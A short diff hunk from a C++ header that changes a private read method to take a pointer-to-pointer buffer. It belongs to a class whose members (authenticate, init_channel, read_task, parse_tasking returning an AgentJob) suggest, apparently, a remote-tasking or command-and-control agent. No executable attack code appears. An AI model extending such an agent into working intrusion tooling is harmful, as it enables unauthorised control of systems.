@@ -18,7 +18,7 @@ private:
     int authenticate();
     int init_channel();
     int write(char *buffer, int len);
-    int read(char *buffer, int len);
+    int read(char **buffer, int len);
     unsigned long read_task();
     AgentJob *parse_tasking(unsigned long tasking);
 public:
